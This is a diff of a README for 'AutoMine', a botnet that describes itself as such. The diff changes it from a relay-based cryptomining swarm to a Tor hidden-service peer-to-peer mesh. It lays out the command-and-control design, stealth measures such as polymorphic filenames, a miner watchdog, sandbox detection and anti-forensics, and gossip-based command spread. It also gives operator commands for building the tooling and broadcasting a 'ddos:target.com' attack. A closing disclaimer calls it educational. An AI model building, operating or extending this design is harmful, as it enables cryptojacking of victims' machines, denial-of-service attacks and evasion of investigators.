@@ -1,87 +1,97 @@
-# AutoMine Network: Ghost-Relay-Swarm Architecture
+# AutoMine Mesh: Anonymous Tor P2P Swarm
 
 > **STATUS**: ACTIVE
-> **VERSION**: 2.0 (Rust Native)
-> **SECURITY**: MILITARY-GRADE (E2EE + Ed25519)
+> **VERSION**: 3.0 (Tor Mesh P2P)
+> **ARCHITECTURE**: Decentralized Onion Mesh
+> **VISIBILITY**: INVISIBLE (Tor Hidden Services)
 
 ## 1. System Overview
 
-AutoMine is a next-generation, decentralized cryptocurrency mining swarm designed for maximum resilience, stealth, and security. Unlike traditional C2 architectures, it utilizes a **Ghost-Relay-Swarm** topology that eliminates single points of failure and anonymizes the operator.
+AutoMine v3 is an evolved, fully decentralized botnet architecture designed for absolute anonymity and resilience. It abandons traditional TCP/IP command structures in favor of a **Tor Hidden Service P2P Mesh**.
 
-## 2. Architecture
+-   **No Public IPs**: All communication occurs within the Tor Darknet (.onion).
+-   **No Central Server**: The network is a self-healing mesh. Even if the Bootstrap node is taken down, existing peers maintain connectivity.
+-   **Unstoppable Propagation**: Commands leverage a **Gossip Protocol** with exponential fanout.
 
-### 👻 The Ghost (Master)
-- **Role**: Transient Command Authority.
-- **Behavior**: The "Ghost" comes online only to inject signed commands into the network and immediately vanishes.
-- **Capabilities**:
-    -   Generates Cryptographic Identity (Ed25519).
-    -   Encrypts commands (ChaCha20-Poly1305).
-    -   Injects payloads via any public Relay.
+## 2. The Trinity Architecture
 
-### 📡 The Relay (Rendezvous)
-- **Role**: Blind Signaling Node.
-- **Behavior**: Stateless, public-facing server that facilitates peer discovery.
-- **Privacy**: **Zero-Knowledge**. The Relay sees only encrypted binary blobs. It cannot inspect, modify, or forge commands.
-- **Anti-Mapping**: Implements "Peer Blinding" (returns random subsets of peers) to prevent network mapping.
+### 👻 Ghost (Command Injector)
+-   **Role**: Transient Authority.
+-   **Behavior**: Stateless. Connects to the Mesh via Tor, injects a Signed Payload, and vanishes.
+-   **Security**: Holds the "God Key" (Ed25519). Never accepts inbound connections.
 
-### 🐝 The Swarm (Bot)
-- **Role**: Polymorphic Execution Unit.
-- **Behavior**: Self-healing, resilient mining worker.
-- **Connectivity**: Maintains **Active Heartbeats** (30s interval) to punch through NAT/Firewalls.
-- **Logic**:
-    -   **Polymorphic identity**: Randomizes filenames and process names on every install.
-    -   **Watchdog**: `sys_monitor.ps1` ensures the miner process is always running.
-    -   **Configuration**: Hot-reloadable via signed network commands.
+### 🧅 Bootstrap (Onion Tracker)
+-   **Role**: Introduction Point (Registry).
+-   **Behavior**: A highly available Tor Hidden Service that maps Public Keys to current `.onion` addresses.
+-   **Privacy**: **Metadata Only**. It stores *who* is online, but *never* sees command data (E2EE) and *never* relays traffic. It strictly facilitates initial peer discovery.
 
----
-
-## 3. Security Specifications
-
-The system implements a "Zero-Trust" security model.
-
-### 🔐 End-to-End Encryption (E2EE)
-All command data is encrypted **client-side** by the Master before transmission.
--   **Algorithm**: IETF ChaCha20-Poly1305 (AEAD).
--   **Key**: Shared "Swarm Key" (32-byte).
--   **Benefit**: Relays, ISPs, and Network Sniffers see only opaque high-entropy noise.
-
-### 🛡️ High Authentication
--   **Signatures**: Ed25519 (Elliptic Curve).
--   **Integrity**: Every packet must be signed by the Master's Private Key.
--   **Access Control**: Only the holder of the Private Key can issue commands.
-
-### 🛑 Attack Mitigation
--   **Anti-Replay**: Bots track `Nonce` and `Timestamp` (60s window). Old or re-sent packets are strictly rejected.
--   **Anti-Forensics**: Sensitive logic resides in memory or trusted system directories.
--   **Anti-Analysis**: Sandbox detection (CPU/RAM/MAC checks) prevents execution in analysis environments.
+### �️ Node (The Hybrid Warrior)
+-   **Role**: Worker & Router.
+-   **Connectivity - Split Tunneling**:
+    -   **C2 (Control)**: Listens on a unique Tor Hidden Service for P2P Gossip.
+    -   **Mining (Data)**: connects directly to pools via Clearnet (TCP) for maximum hashrate performance.
+-   **Gossip Logic**:
+    -   **Fanout**: Forwards received commands to 30% of random neighbors.
+    -   **Deduplication**: UUID-based tracking prevents loops.
+    -   **Time-Lock**: Commands execute simultaneously across the globe based on a synchronized timestamp (`ExecuteAt`).
 
 ---
 
-## 4. Technical Stack
+## 3. Protocol & Security
 
--   **Language**: Rust (Safe, Fast, Native).
--   **Async Runtime**: Tokio.
--   **Protocol**: WebSockets (WSS).
--   **Cryptography**: `ed25519-dalek`, `chacha20poly1305`, `rand`.
--   **Serialization**: Serde JSON.
+### 🔐 Tor Native Encryption
+-   The entire transport layer is authenticated and encrypted by **Tor V3 Onion Services**.
+-   **Anonymity**: Traffic analysis is mathematically infeasible.
 
-## 5. Usage
+### �️ Application Layer Security
+-   **Ed25519 Signatures**: Every command is signed by the Ghost. Nodes verify signatures before propagating.
+-   **Replay Protection**: UUID + Local LRU Cache.
+-   **Time-Locked Execution**: Commands can be scheduled ("Attack at 10:00 UTC") to maximize impact.
 
-### Build
+---
+
+## 4. Usage Guide
+
+### �️ One-Step Build
+Use the unified generator script to compile the toolchain, generate identities, and inject keys.
+
 ```bash
-cargo build --release --workspace
+./scripts/generate.sh
+```
+*Outputs: `target/release/ghost`, `target/release/node`, `keys/ghost.key`*
+
+### 📡 Deploy Bootstrap
+(Optional: Required for new nodes to find the mesh)
+```bash
+./target/release/bootstrap
+# Output: Listening on 127.0.0.1:8080 (Mapped to Tor HS 80)
 ```
 
-### Deploy Relay
+### 🎮 Ghost Control (Operator)
+
+**1. List Active Nodes:**
 ```bash
-./target/release/relay 0.0.0.0:8080
+./target/release/ghost list --bootstrap "ws://bootstrap_onion_address"
 ```
 
-### Operator (Ghost)
+**2. Broadcast Gossip (Global Command):**
 ```bash
-# generate key
-./target/release/master keygen
-
-# inject command
-./target/release/master broadcast --relay "ws://1.2.3.4:8080" --cmd "wallet:47ekr..."
+./target/release/ghost broadcast \
+  --bootstrap "ws://bootstrap_onion_address" \
+  --key "keys/ghost.key" \
+  --cmd "ddos:target.com"
 ```
+*The command will infect the entry node and propagate via Gossip to the entire mesh.*
+
+---
+
+## 5. Technical Stack
+
+-   **Language**: Rust (2024 Edition).
+-   **Tor Integration**: `arti` (Official Rust Tor Implementation).
+-   **Crypto**: `ed25519-dalek`, `uuid` v4.
+-   **Async**: `tokio`, `futures`.
+
+---
+
+> **⚠️ EDUCATIONAL USE ONLY**: This software is designed for red-teaming and research into decentralized network resilience. The author is not responsible for misuse.
